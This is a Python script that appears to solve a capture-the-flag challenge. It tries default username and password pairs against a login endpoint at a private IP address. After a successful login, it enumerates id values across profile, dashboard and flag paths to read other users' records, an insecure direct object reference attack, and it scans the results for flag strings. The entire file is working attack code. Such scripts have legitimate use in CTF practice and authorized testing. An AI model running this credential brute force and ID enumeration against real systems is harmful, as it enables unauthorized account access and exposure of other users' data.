import requests
import json

TARGET_URL = "http://10.0.162.114:5003/login"

CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "123456"),
    ("test", "test"),
    ("user", "user"),
    ("root", "root"),
    ("guest", "guest"),
    ("administrator", "administrator"),
    ("admin", "password"),
    ("admin", "admin123")
]

def main():
    session = requests.Session()
    
    for username, password in CREDENTIALS:
        payload = {
            "username": username,
            "password": password
        }
        headers = {
            "Content-Type": "application/json"
        }
        
        try:
            response = session.post(TARGET_URL, json=payload, headers=headers)
            
            if response.status_code == 200:
                print(f"[+] Login successful!")
                print(f"[+] Username: {username}, Password: {password}")
                print(f"[+] Response Body: {response.text}")
                
                base_url = TARGET_URL.rsplit('/', 1)[0]
                
                try:
                    resp_json = response.json()
                    user_id = resp_json.get("userID") or resp_json.get("user_id") or resp_json.get("id")
                    if user_id:
                        print(f"[*] Extracted userID: {user_id}, trying to access user profile...")
                        profile_url = f"{base_url}/user?id={user_id}"
                        profile_resp = session.get(profile_url)
                        if profile_resp.status_code == 200:
                            print(f"[+] Profile response for id {user_id}: {profile_resp.text}")
                except json.JSONDecodeError:
                    pass

                print("[*] Brute-forcing id parameter from 1 to 10...")
                for i in range(1, 11):
                    for path in ["/user", "/profile", "/dashboard", "/flag"]:
                        test_url = f"{base_url}{path}?id={i}"
                        try:
                            test_resp = session.get(test_url)
                            if test_resp.status_code == 200 and "Invalid" not in test_resp.text and "Not Found" not in test_resp.text:
                                print(f"[+] Found valid response at {test_url}: {test_resp.text}")
                                if "flag{" in test_resp.text or "CTF{" in test_resp.text:
                                    print(f"[!] FLAG FOUND: {test_resp.text}")
                        except requests.exceptions.RequestException:
                            continue
                
                break
            
            elif response.status_code == 401:
                print(f"[-] Failed: {username}/{password} - Invalid credentials")
            else:
                print(f"[?] Unexpected status code {response.status_code} for {username}/{password}: {response.text}")
                
        except requests.exceptions.RequestException as e:
            print(f"[!] Request error for {username}/{password}: {e}")
            break

if __name__ == "__main__":
    main()